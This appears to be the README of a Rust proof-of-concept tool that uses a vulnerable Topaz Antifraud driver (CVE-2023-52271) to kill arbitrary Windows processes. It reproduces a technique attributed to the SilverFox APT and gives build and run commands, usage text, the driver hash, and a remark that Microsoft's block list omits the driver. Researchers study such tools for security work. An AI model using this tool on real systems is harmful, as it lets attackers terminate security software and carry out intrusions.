# Wsftprm-Killer
- Reproduction SilverFox (APT-Q-27) [BYOVD](https://paper.seebug.org/3337/)
- PoC for CVE-2023-52271 vulnerability in wsftprm driver from Topaz Antifraud
- wsftprm.sys SHA256: `FF5DBDCF6D7AE5D97B6F3EF412DF0B977BA4A844C45B30CA78C0EEB2653D69A8`
- The driver is **listed on [LOLDDrivers](https://www.loldrivers.io/)** but remains **absent** from [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules) as of 2025-07-21

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

## Usage

Place `wsftprm.sys` in the same directory as the executable (driver file must be named `wsftprm.sys`).

```text
BYOVD process killer using wsftprm driver (CVE-2023-52271)

Usage: Wsftprm-Killer.exe --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., notepad.exe)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p Wsftprm-Killer

# Run
.\Wsftprm-Killer.exe -n notepad.exe
```

Windows 10 Pro (Up to date)

<img width="1915" height="816" alt="wsftprn-poc" src="https://github.com/user-attachments/assets/6bec86f5-ba35-4db0-8fbf-2439bae48d13" />
